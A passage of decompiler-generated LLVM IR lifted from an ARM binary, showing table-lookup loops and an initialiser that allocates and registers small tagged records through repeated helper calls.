  br i1 %v2_a330, label %dec_label_pc_a2a4, label %dec_label_pc_a33c

dec_label_pc_a33c:                                ; preds = %dec_label_pc_a294, %dec_label_pc_a324
  %v0_a340 = phi i32 [ %v3_a294, %dec_label_pc_a294 ], [ %v3_a32c, %dec_label_pc_a324 ]
  %v2_a340 = call i32 @function_14e24(i32 %v0_a340, i32 9)
  %v3_a344 = load i32, i32* @global_var_22388.62, align 4
  store i32 %v3_a344, i32* @r0, align 4
  %v2_a348 = icmp eq i32 %v3_a344, 0
  %v0_a34c = load i32, i32* @r5, align 4
  store i32 %v0_a34c, i32* @global_var_22384.61, align 4
  br i1 %v2_a348, label %dec_label_pc_a2b4, label %dec_label_pc_a354

dec_label_pc_a354:                                ; preds = %dec_label_pc_a2a4, %dec_label_pc_a33c
  %v0_a358 = phi i32 [ %v3_a2a4, %dec_label_pc_a2a4 ], [ %v3_a344, %dec_label_pc_a33c ]
  %v2_a358 = call i32 @function_14e24(i32 %v0_a358, i32 9)
  %v3_a35c = load i32, i32* @global_var_2238c.63, align 4
  store i32 %v3_a35c, i32* @r0, align 4
  %v2_a360 = icmp eq i32 %v3_a35c, 0
  %v0_a364 = load i32, i32* @r5, align 4
  store i32 %v0_a364, i32* @global_var_22388.62, align 4
  br i1 %v2_a360, label %dec_label_pc_a2c4, label %dec_label_pc_a36c

dec_label_pc_a36c:                                ; preds = %dec_label_pc_a2b4, %dec_label_pc_a354
  %v0_a370 = phi i32 [ %v3_a2b4, %dec_label_pc_a2b4 ], [ %v3_a35c, %dec_label_pc_a354 ]
  %v2_a370 = call i32 @function_14e24(i32 %v0_a370, i32 9)
  %v3_a374 = load i32, i32* @global_var_22390.64, align 4
  store i32 %v3_a374, i32* @r0, align 4
  %v2_a378 = icmp eq i32 %v3_a374, 0
  %v0_a37c = load i32, i32* @r5, align 4
  store i32 %v0_a37c, i32* @global_var_2238c.63, align 4
  br i1 %v2_a378, label %dec_label_pc_a2d4, label %dec_label_pc_a384

dec_label_pc_a384:                                ; preds = %dec_label_pc_a2c4, %dec_label_pc_a36c
  %v0_a388 = phi i32 [ %v3_a2c4, %dec_label_pc_a2c4 ], [ %v3_a374, %dec_label_pc_a36c ]
  %v2_a388 = call i32 @function_14e24(i32 %v0_a388, i32 9)
  %v3_a38c = load i32, i32* @global_var_22394.65, align 4
  store i32 %v3_a38c, i32* @r0, align 4
  %v2_a390 = icmp eq i32 %v3_a38c, 0
  %v0_a394 = load i32, i32* @r5, align 4
  store i32 %v0_a394, i32* @global_var_22390.64, align 4
  br i1 %v2_a390, label %dec_label_pc_a2e4, label %dec_label_pc_a39c

dec_label_pc_a39c:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a384
  %v0_a3a0 = phi i32 [ %v3_a2d4, %dec_label_pc_a2d4 ], [ %v3_a38c, %dec_label_pc_a384 ]
  %v2_a3a0 = call i32 @function_14e24(i32 %v0_a3a0, i32 9)
  %v3_a3a4 = load i32, i32* @global_var_22398.66, align 4
  store i32 %v3_a3a4, i32* @r0, align 4
  %v2_a3a8 = icmp eq i32 %v3_a3a4, 0
  %v0_a3ac = load i32, i32* @r5, align 4
  store i32 %v0_a3ac, i32* @global_var_22394.65, align 4
  br i1 %v2_a3a8, label %dec_label_pc_a2f4, label %dec_label_pc_a3b4

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a2e4, %dec_label_pc_a39c
  %v0_a3b8 = phi i32 [ %v3_a2e4, %dec_label_pc_a2e4 ], [ %v3_a3a4, %dec_label_pc_a39c ]
  %v2_a3b8 = call i32 @function_14e24(i32 %v0_a3b8, i32 9)
  %v0_a2f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a2f4

; uselistorder directives
  uselistorder i32 %v0_a3ac, { 1, 0 }
  uselistorder i32 %v0_a394, { 1, 0 }
  uselistorder i32 %v0_a37c, { 1, 0 }
  uselistorder i32 %v0_a364, { 1, 0 }
  uselistorder i32 %v0_a34c, { 1, 0 }
  uselistorder i32 %v0_a334, { 1, 0 }
  uselistorder label %dec_label_pc_a3b4, { 1, 0 }
  uselistorder label %dec_label_pc_a39c, { 1, 0 }
  uselistorder label %dec_label_pc_a384, { 1, 0 }
  uselistorder label %dec_label_pc_a36c, { 1, 0 }
  uselistorder label %dec_label_pc_a354, { 1, 0 }
  uselistorder label %dec_label_pc_a33c, { 1, 0 }
  uselistorder label %dec_label_pc_a2f4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a2e4, { 1, 0 }
  uselistorder label %dec_label_pc_a2d4, { 1, 0 }
  uselistorder label %dec_label_pc_a2c4, { 1, 0 }
  uselistorder label %dec_label_pc_a2b4, { 1, 0 }
  uselistorder label %dec_label_pc_a2a4, { 1, 0 }
}

define i32 @function_a3c4(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_a3c4:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_a3c4 = icmp eq i32 %arg1, 0
  %v3_a3c8 = load i32, i32* @r4, align 4
  store i32 %v3_a3c8, i32* %stack_var_-8, align 4
  %v6_a3c8 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_a3c4, label %dec_label_pc_a40c, label %dec_label_pc_a3d4

dec_label_pc_a3d4:                                ; preds = %dec_label_pc_a3c4
  %v0_a3d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a3d4 = add i32 %v0_a3d4, 4
  %v2_a3d4 = inttoptr i32 %v1_a3d4 to i8*
  %v3_a3d4 = load i8, i8* %v2_a3d4, align 1
  %v4_a3d4 = zext i8 %v3_a3d4 to i32
  %v9_a3d8 = icmp eq i32 %v4_a3d4, %arg3
  br i1 %v9_a3d8, label %dec_label_pc_a418, label %dec_label_pc_a3fc.preheader

dec_label_pc_a3fc.preheader:                      ; preds = %dec_label_pc_a3d4
  br label %dec_label_pc_a3fc

dec_label_pc_a3ec:                                ; preds = %dec_label_pc_a3fc
  %v1_a3ec = add i32 %v0_a3f4.in, 12
  %v2_a3ec = inttoptr i32 %v1_a3ec to i8*
  %v3_a3ec = load i8, i8* %v2_a3ec, align 1
  %v4_a3ec = zext i8 %v3_a3ec to i32
  %v9_a3f0 = icmp eq i32 %v4_a3ec, %arg3
  br i1 %v9_a3f0, label %dec_label_pc_a418, label %dec_label_pc_a3fc

dec_label_pc_a3fc:                                ; preds = %dec_label_pc_a3fc.preheader, %dec_label_pc_a3ec
  %v0_a3f4.in = phi i32 [ %v0_a3d4, %dec_label_pc_a3fc.preheader ], [ %v0_a3f4, %dec_label_pc_a3ec ]
  %v0_a3fc = phi i32 [ 0, %dec_label_pc_a3fc.preheader ], [ %v1_a3fc, %dec_label_pc_a3ec ]
  %v0_a3f4 = add i32 %v0_a3f4.in, 8
  %v1_a3fc = add i32 %v0_a3fc, 1
  store i32 %v1_a3fc, i32* @lr, align 4
  %v9_a400 = icmp eq i32 %v1_a3fc, %arg1
  store i32 %v0_a3f4, i32* %r1.global-to-local, align 4
  br i1 %v9_a400, label %dec_label_pc_a40c, label %dec_label_pc_a3ec

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3fc, %dec_label_pc_a418, %dec_label_pc_a3c4, %dec_label_pc_a424
  %v2_a410 = phi i32 [ %v3_a3c8, %dec_label_pc_a418 ], [ %v3_a3c8, %dec_label_pc_a3c4 ], [ %v2_a410.pre, %dec_label_pc_a424 ], [ %v3_a3c8, %dec_label_pc_a3fc ]
  %v0_a40c = phi i32 [ %arg4, %dec_label_pc_a418 ], [ %arg4, %dec_label_pc_a3c4 ], [ %v1_a424, %dec_label_pc_a424 ], [ %arg4, %dec_label_pc_a3fc ]
  store i32 %v2_a410, i32* @r4, align 4
  store i32 %v6_a3c8, i32* @lr, align 4
  ret i32 %v0_a40c

dec_label_pc_a418:                                ; preds = %dec_label_pc_a3ec, %dec_label_pc_a3d4
  %v0_a418 = phi i32 [ %v0_a3d4, %dec_label_pc_a3d4 ], [ %v0_a3f4, %dec_label_pc_a3ec ]
  %v1_a418 = inttoptr i32 %v0_a418 to i32*
  %v2_a418 = load i32, i32* %v1_a418, align 4
  store i32 %v2_a418, i32* @r0, align 4
  %v2_a41c = icmp eq i32 %v2_a418, 0
  br i1 %v2_a41c, label %dec_label_pc_a40c, label %dec_label_pc_a424

dec_label_pc_a424:                                ; preds = %dec_label_pc_a418
  %v1_a424 = call i32 @function_148ac(i32 %v2_a418)
  %v2_a410.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a40c

; uselistorder directives
  uselistorder i32 %v1_a3fc, { 1, 2, 0 }
  uselistorder i32 %v0_a3f4, { 1, 0, 2 }
  uselistorder i32 %v0_a3f4.in, { 1, 0 }
  uselistorder i32 %v0_a3d4, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a40c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a3fc, { 1, 0 }
}

define i32 @function_a430(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a430:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_a430 = icmp eq i32 %arg1, 0
  %v3_a434 = load i32, i32* @r4, align 4
  store i32 %v3_a434, i32* %stack_var_-8, align 4
  %v6_a434 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_a430, label %dec_label_pc_a478, label %dec_label_pc_a440

dec_label_pc_a440:                                ; preds = %dec_label_pc_a430
  %v0_a440 = load i32, i32* %r1.global-to-local, align 4
  %v1_a440 = add i32 %v0_a440, 4
  %v2_a440 = inttoptr i32 %v1_a440 to i8*
  %v3_a440 = load i8, i8* %v2_a440, align 1
  %v4_a440 = zext i8 %v3_a440 to i32
  %v9_a444 = icmp eq i32 %v4_a440, %arg3
  br i1 %v9_a444, label %dec_label_pc_a484, label %dec_label_pc_a468.preheader

dec_label_pc_a468.preheader:                      ; preds = %dec_label_pc_a440
  br label %dec_label_pc_a468

dec_label_pc_a458:                                ; preds = %dec_label_pc_a468
  %v1_a458 = add i32 %v0_a460.in, 12
  %v2_a458 = inttoptr i32 %v1_a458 to i8*
  %v3_a458 = load i8, i8* %v2_a458, align 1
  %v4_a458 = zext i8 %v3_a458 to i32
  %v9_a45c = icmp eq i32 %v4_a458, %arg3
  br i1 %v9_a45c, label %dec_label_pc_a484, label %dec_label_pc_a468

dec_label_pc_a468:                                ; preds = %dec_label_pc_a468.preheader, %dec_label_pc_a458
  %v0_a460.in = phi i32 [ %v0_a440, %dec_label_pc_a468.preheader ], [ %v0_a460, %dec_label_pc_a458 ]
  %v0_a468 = phi i32 [ 0, %dec_label_pc_a468.preheader ], [ %v1_a468, %dec_label_pc_a458 ]
  %v0_a460 = add i32 %v0_a460.in, 8
  %v1_a468 = add i32 %v0_a468, 1
  store i32 %v1_a468, i32* @lr, align 4
  %v9_a46c = icmp eq i32 %v1_a468, %arg1
  store i32 %v0_a460, i32* %r1.global-to-local, align 4
  br i1 %v9_a46c, label %dec_label_pc_a478, label %dec_label_pc_a458

dec_label_pc_a478:                                ; preds = %dec_label_pc_a468, %dec_label_pc_a484, %dec_label_pc_a430, %dec_label_pc_a490
  %v2_a47c = phi i32 [ %v3_a434, %dec_label_pc_a484 ], [ %v3_a434, %dec_label_pc_a430 ], [ %v2_a47c.pre, %dec_label_pc_a490 ], [ %v3_a434, %dec_label_pc_a468 ]
  %v0_a478 = phi i32 [ %arg4, %dec_label_pc_a484 ], [ %arg4, %dec_label_pc_a430 ], [ %v3_a494, %dec_label_pc_a490 ], [ %arg4, %dec_label_pc_a468 ]
  store i32 %v2_a47c, i32* @r4, align 4
  store i32 %v6_a434, i32* @lr, align 4
  ret i32 %v0_a478

dec_label_pc_a484:                                ; preds = %dec_label_pc_a458, %dec_label_pc_a440
  %v0_a484 = phi i32 [ %v0_a440, %dec_label_pc_a440 ], [ %v0_a460, %dec_label_pc_a458 ]
  %v1_a484 = inttoptr i32 %v0_a484 to i32*
  %v2_a484 = load i32, i32* %v1_a484, align 4
  %v2_a488 = icmp eq i32 %v2_a484, 0
  br i1 %v2_a488, label %dec_label_pc_a478, label %dec_label_pc_a490

dec_label_pc_a490:                                ; preds = %dec_label_pc_a484
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a494 = inttoptr i32 %v2_a484 to i8*
  %v3_a494 = call i32 @function_12494(i8* %v2_a494, i32 10)
  %v2_a47c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_a478

; uselistorder directives
  uselistorder i32 %v1_a468, { 1, 2, 0 }
  uselistorder i32 %v0_a460, { 1, 0, 2 }
  uselistorder i32 %v0_a460.in, { 1, 0 }
  uselistorder i32 %v0_a440, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_a478, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_a468, { 1, 0 }
}

define i32 @function_a4a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_a4a0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a4b0 = call i32 @function_13258(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_22374.53 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_22378.55 to i32), i32* @r6, align 4
  store i32 52092, i32* %r2.global-to-local, align 4
  store i32 %v2_a4b0, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_22375.70 to i32), i32* %r1.global-to-local, align 4
  %v2_a4d0 = load i32, i32* @global_var_22378.55, align 4
  %v2_a4d4 = inttoptr i32 %v2_a4b0 to i32*
  store i32 52092, i32* %v2_a4d4, align 4
  %v3_a4d8 = load i32, i32* @r4, align 4
  %v4_a4d8 = add i32 %v3_a4d8, 4
  %v5_a4d8 = inttoptr i32 %v4_a4d8 to i8*
  store i8 0, i8* %v5_a4d8, align 1
  %v0_a4dc = load i32, i32* %r1.global-to-local, align 4
  %v3_a4dc = mul i32 %v0_a4dc, 4
  store i32 %v3_a4dc, i32* %r1.global-to-local, align 4
  %v5_a4e0 = call i32 @function_14414(i32 %v2_a4d0, i32 %v3_a4dc, i32 52092, i32 0)
  %v2_a4e4 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a4e4 = zext i8 %v2_a4e4 to i32
  store i32 %v5_a4e0, i32* %r2.global-to-local, align 4
  %v0_a4ec = load i32, i32* @r4, align 4
  %v5_a4ec = mul nuw nsw i32 %v3_a4e4, 4
  %v6_a4ec = add i32 %v5_a4ec, %v5_a4e0
  %v7_a4ec = inttoptr i32 %v6_a4ec to i32*
  store i32 %v0_a4ec, i32* %v7_a4ec, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_22375.70 to i32), i32* %r3.global-to-local, align 4
  %v1_a4fc = load i32, i32* @r6, align 4
  %v2_a4fc = inttoptr i32 %v1_a4fc to i32*
  store i32 %v5_a4e0, i32* %v2_a4fc, align 4
  %v0_a500 = load i32, i32* %r3.global-to-local, align 4
  %v1_a500 = trunc i32 %v0_a500 to i8
  %v2_a500 = load i32, i32* @r5, align 4
  %v3_a500 = inttoptr i32 %v2_a500 to i8*
  store i8 %v1_a500, i8* %v3_a500, align 1
  %v2_a504 = call i32 @function_13258(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_d024.72 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  store i32 %v2_a504, i32* @r4, align 4
  store i32 ptrtoint (i8* @global_var_22375.70 to i32), i32* %r1.global-to-local, align 4
  %v2_a51c = load i32, i32* @global_var_22378.55, align 4
  %v2_a520 = inttoptr i32 %v2_a504 to i32*
  store i32 ptrtoint (i32* @global_var_d024.72 to i32), i32* %v2_a520, align 4
  %v0_a524 = load i32, i32* @r7, align 4
  %v1_a524 = trunc i32 %v0_a524 to i8
  %v2_a524 = load i32, i32* @r4, align 4
  %v3_a524 = add i32 %v2_a524, 4
  %v4_a524 = inttoptr i32 %v3_a524 to i8*
  store i8 %v1_a524, i8* %v4_a524, align 1
  %v0_a528 = load i32, i32* %r1.global-to-local, align 4
  %v3_a528 = mul i32 %v0_a528, 4
  store i32 %v3_a528, i32* %r1.global-to-local, align 4
  %v4_a52c = call i32 @function_14414(i32 %v2_a51c, i32 %v3_a528, i32 %v5_a4e0, i32 ptrtoint (i32* @global_var_d024.72 to i32))
  %v2_a530 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a530 = zext i8 %v2_a530 to i32
  store i32 %v3_a530, i32* %r3.global-to-local, align 4
  store i32 %v4_a52c, i32* %r2.global-to-local, align 4
  %v0_a538 = load i32, i32* @r4, align 4
  %v5_a538 = mul nuw nsw i32 %v3_a530, 4
  %v6_a538 = add i32 %v5_a538, %v4_a52c
  %v7_a538 = inttoptr i32 %v6_a538 to i32*
  store i32 %v0_a538, i32* %v7_a538, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a540 = load i32, i32* %r3.global-to-local, align 4
  %v1_a540 = load i32, i32* @r7, align 4
  %v2_a540 = add i32 %v1_a540, %v0_a540
  store i32 %v2_a540, i32* %r3.global-to-local, align 4
  %v1_a548 = trunc i32 %v2_a540 to i8
  %v2_a548 = load i32, i32* @r5, align 4
  %v3_a548 = inttoptr i32 %v2_a548 to i8*
  store i8 %v1_a548, i8* %v3_a548, align 1
  %v0_a54c = load i32, i32* %r2.global-to-local, align 4
  %v1_a54c = load i32, i32* @r6, align 4
  %v2_a54c = inttoptr i32 %v1_a54c to i32*
  store i32 %v0_a54c, i32* %v2_a54c, align 4
  %v2_a550 = call i32 @function_13258(i32 %v1_a540, i32 8)
  %v2_a554 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a554 = zext i8 %v2_a554 to i32
  store i32 ptrtoint (i32* @global_var_d430.74 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a550, i32* @r4, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_a564 = load i32, i32* @r7, align 4
  %v2_a564 = add i32 %v1_a564, %v3_a554
  store i32 %v2_a564, i32* %r1.global-to-local, align 4
  %v2_a568 = load i32, i32* @global_var_22378.55, align 4
  %v2_a56c = inttoptr i32 %v2_a550 to i32*
  store i32 ptrtoint (i32* @global_var_d430.74 to i32), i32* %v2_a56c, align 4
  %v3_a570 = load i32, i32* @r4, align 4
  %v4_a570 = add i32 %v3_a570, 4
  %v5_a570 = inttoptr i32 %v4_a570 to i8*
  store i8 2, i8* %v5_a570, align 1
  %v0_a574 = load i32, i32* %r1.global-to-local, align 4
  %v3_a574 = mul i32 %v0_a574, 4
  store i32 %v3_a574, i32* %r1.global-to-local, align 4
  %v5_a578 = call i32 @function_14414(i32 %v2_a568, i32 %v3_a574, i32 ptrtoint (i32* @global_var_d430.74 to i32), i32 2)
  %v2_a57c = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a57c = zext i8 %v2_a57c to i32
  store i32 %v3_a57c, i32* %r3.global-to-local, align 4
  store i32 %v5_a578, i32* %r2.global-to-local, align 4
  %v0_a584 = load i32, i32* @r4, align 4
  %v5_a584 = mul nuw nsw i32 %v3_a57c, 4
  %v6_a584 = add i32 %v5_a584, %v5_a578
  %v7_a584 = inttoptr i32 %v6_a584 to i32*
  store i32 %v0_a584, i32* %v7_a584, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a58c = load i32, i32* %r3.global-to-local, align 4
  %v1_a58c = load i32, i32* @r7, align 4
  %v2_a58c = add i32 %v1_a58c, %v0_a58c
  store i32 %v2_a58c, i32* %r3.global-to-local, align 4
  %v1_a594 = trunc i32 %v2_a58c to i8
  %v2_a594 = load i32, i32* @r5, align 4
  %v3_a594 = inttoptr i32 %v2_a594 to i8*
  store i8 %v1_a594, i8* %v3_a594, align 1
  %v0_a598 = load i32, i32* %r2.global-to-local, align 4
  %v1_a598 = load i32, i32* @r6, align 4
  %v2_a598 = inttoptr i32 %v1_a598 to i32*
  store i32 %v0_a598, i32* %v2_a598, align 4
  %v2_a59c = call i32 @function_13258(i32 %v1_a58c, i32 8)
  %v2_a5a0 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a5a0 = zext i8 %v2_a5a0 to i32
  store i32 ptrtoint (i32* @global_var_c8ec.76 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a59c, i32* @r4, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_a5b0 = load i32, i32* @r7, align 4
  %v2_a5b0 = add i32 %v1_a5b0, %v3_a5a0
  store i32 %v2_a5b0, i32* %r1.global-to-local, align 4
  %v2_a5b4 = load i32, i32* @global_var_22378.55, align 4
  %v2_a5b8 = inttoptr i32 %v2_a59c to i32*
  store i32 ptrtoint (i32* @global_var_c8ec.76 to i32), i32* %v2_a5b8, align 4
  %v3_a5bc = load i32, i32* @r4, align 4
  %v4_a5bc = add i32 %v3_a5bc, 4
  %v5_a5bc = inttoptr i32 %v4_a5bc to i8*
  store i8 9, i8* %v5_a5bc, align 1
  %v0_a5c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a5c0 = mul i32 %v0_a5c0, 4
  store i32 %v3_a5c0, i32* %r1.global-to-local, align 4
  %v5_a5c4 = call i32 @function_14414(i32 %v2_a5b4, i32 %v3_a5c0, i32 ptrtoint (i32* @global_var_c8ec.76 to i32), i32 9)
  %v2_a5c8 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a5c8 = zext i8 %v2_a5c8 to i32
  store i32 %v3_a5c8, i32* %r3.global-to-local, align 4
  store i32 %v5_a5c4, i32* %r2.global-to-local, align 4
  %v0_a5d0 = load i32, i32* @r4, align 4
  %v5_a5d0 = mul nuw nsw i32 %v3_a5c8, 4
  %v6_a5d0 = add i32 %v5_a5d0, %v5_a5c4
  %v7_a5d0 = inttoptr i32 %v6_a5d0 to i32*
  store i32 %v0_a5d0, i32* %v7_a5d0, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a5d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5d8 = load i32, i32* @r7, align 4
  %v2_a5d8 = add i32 %v1_a5d8, %v0_a5d8
  store i32 %v2_a5d8, i32* %r3.global-to-local, align 4
  %v1_a5e0 = trunc i32 %v2_a5d8 to i8
  %v2_a5e0 = load i32, i32* @r5, align 4
  %v3_a5e0 = inttoptr i32 %v2_a5e0 to i8*
  store i8 %v1_a5e0, i8* %v3_a5e0, align 1
  %v0_a5e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a5e4 = load i32, i32* @r6, align 4
  %v2_a5e4 = inttoptr i32 %v1_a5e4 to i32*
  store i32 %v0_a5e4, i32* %v2_a5e4, align 4
  %v2_a5e8 = call i32 @function_13258(i32 %v1_a5d8, i32 8)
  %v2_a5ec = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a5ec = zext i8 %v2_a5ec to i32
  store i32 ptrtoint (i32* @global_var_c270.78 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5e8, i32* @r4, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_a5fc = load i32, i32* @r7, align 4
  %v2_a5fc = add i32 %v1_a5fc, %v3_a5ec
  store i32 %v2_a5fc, i32* %r1.global-to-local, align 4
  %v2_a600 = load i32, i32* @global_var_22378.55, align 4
  %v2_a604 = inttoptr i32 %v2_a5e8 to i32*
  store i32 ptrtoint (i32* @global_var_c270.78 to i32), i32* %v2_a604, align 4
  %v3_a608 = load i32, i32* @r4, align 4
  %v4_a608 = add i32 %v3_a608, 4
  %v5_a608 = inttoptr i32 %v4_a608 to i8*
  store i8 3, i8* %v5_a608, align 1
  %v0_a60c = load i32, i32* %r1.global-to-local, align 4
  %v3_a60c = mul i32 %v0_a60c, 4
  store i32 %v3_a60c, i32* %r1.global-to-local, align 4
  %v5_a610 = call i32 @function_14414(i32 %v2_a600, i32 %v3_a60c, i32 ptrtoint (i32* @global_var_c270.78 to i32), i32 3)
  %v2_a614 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a614 = zext i8 %v2_a614 to i32
  store i32 %v3_a614, i32* %r3.global-to-local, align 4
  store i32 %v5_a610, i32* %r2.global-to-local, align 4
  %v0_a61c = load i32, i32* @r4, align 4
  %v5_a61c = mul nuw nsw i32 %v3_a614, 4
  %v6_a61c = add i32 %v5_a61c, %v5_a610
  %v7_a61c = inttoptr i32 %v6_a61c to i32*
  store i32 %v0_a61c, i32* %v7_a61c, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a624 = load i32, i32* %r3.global-to-local, align 4
  %v1_a624 = load i32, i32* @r7, align 4
  %v2_a624 = add i32 %v1_a624, %v0_a624
  store i32 %v2_a624, i32* %r3.global-to-local, align 4
  %v1_a62c = trunc i32 %v2_a624 to i8
  %v2_a62c = load i32, i32* @r5, align 4
  %v3_a62c = inttoptr i32 %v2_a62c to i8*
  store i8 %v1_a62c, i8* %v3_a62c, align 1
  %v0_a630 = load i32, i32* %r2.global-to-local, align 4
  %v1_a630 = load i32, i32* @r6, align 4
  %v2_a630 = inttoptr i32 %v1_a630 to i32*
  store i32 %v0_a630, i32* %v2_a630, align 4
  %v2_a634 = call i32 @function_13258(i32 %v1_a624, i32 8)
  %v2_a638 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a638 = zext i8 %v2_a638 to i32
  store i32 ptrtoint (i32* @global_var_bbb8.80 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a634, i32* @r4, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_a648 = load i32, i32* @r7, align 4
  %v2_a648 = add i32 %v1_a648, %v3_a638
  store i32 %v2_a648, i32* %r1.global-to-local, align 4
  %v2_a64c = load i32, i32* @global_var_22378.55, align 4
  %v2_a650 = inttoptr i32 %v2_a634 to i32*
  store i32 ptrtoint (i32* @global_var_bbb8.80 to i32), i32* %v2_a650, align 4
  %v3_a654 = load i32, i32* @r4, align 4
  %v4_a654 = add i32 %v3_a654, 4
  %v5_a654 = inttoptr i32 %v4_a654 to i8*
  store i8 4, i8* %v5_a654, align 1
  %v0_a658 = load i32, i32* %r1.global-to-local, align 4
  %v3_a658 = mul i32 %v0_a658, 4
  store i32 %v3_a658, i32* %r1.global-to-local, align 4
  %v5_a65c = call i32 @function_14414(i32 %v2_a64c, i32 %v3_a658, i32 ptrtoint (i32* @global_var_bbb8.80 to i32), i32 4)
  %v2_a660 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a660 = zext i8 %v2_a660 to i32
  store i32 %v3_a660, i32* %r3.global-to-local, align 4
  store i32 %v5_a65c, i32* %r2.global-to-local, align 4
  %v0_a668 = load i32, i32* @r4, align 4
  %v5_a668 = mul nuw nsw i32 %v3_a660, 4
  %v6_a668 = add i32 %v5_a668, %v5_a65c
  %v7_a668 = inttoptr i32 %v6_a668 to i32*
  store i32 %v0_a668, i32* %v7_a668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a670 = load i32, i32* %r3.global-to-local, align 4
  %v1_a670 = load i32, i32* @r7, align 4
  %v2_a670 = add i32 %v1_a670, %v0_a670
  store i32 %v2_a670, i32* %r3.global-to-local, align 4
  %v1_a678 = trunc i32 %v2_a670 to i8
  %v2_a678 = load i32, i32* @r5, align 4
  %v3_a678 = inttoptr i32 %v2_a678 to i8*
  store i8 %v1_a678, i8* %v3_a678, align 1
  %v0_a67c = load i32, i32* %r2.global-to-local, align 4
  %v1_a67c = load i32, i32* @r6, align 4
  %v2_a67c = inttoptr i32 %v1_a67c to i32*
  store i32 %v0_a67c, i32* %v2_a67c, align 4
  %v2_a680 = call i32 @function_13258(i32 %v1_a670, i32 8)
  %v2_a684 = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
  %v3_a684 = zext i8 %v2_a684 to i32
  store i32 ptrtoint (i32* @global_var_b420.82 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a680, i32* @r4, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_a694 = load i32, i32* @r7, align 4
  %v2_a694 = add i32 %v1_a694, %v3_a684
  store i32 %v2_a694, i32* %r1.global-to-local, align 4
  %v2_a698 = load i32, i32* @global_var_22378.55, align 4
  %v2_a69c = inttoptr i32 %v2_a680 to i32*
  store i32 ptrtoint (i32* @global_var_b420.82 to i32), i32* %v2_a69c, align 4
  %v3_a6a0 = load i32, i32* @r4, align 4
  %v4_a6a0 = add i32 %v3_a6a0, 4
  %v5_a6a0 = inttoptr i32 %v4_a6a0 to i8*
  store i8 5, i8* %v5_a6a0, align 1
  %v0_a6a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_a6a4 = mul i32 %v0_a6a4, 4
  store i32 %v3_a6a4, i32* %r1.global-to-local, align 4
  %v5_a6a8 = call i32 @function_14414(i32 %v2_a698, i32 %v3_a6a4, i32 ptrtoint (i32* @global_var_b420.82 to i32), i32 5)
  %v2_a6ac = load i8, i8* bitcast (i8** @global_var_22374.53 to i8*), align 4
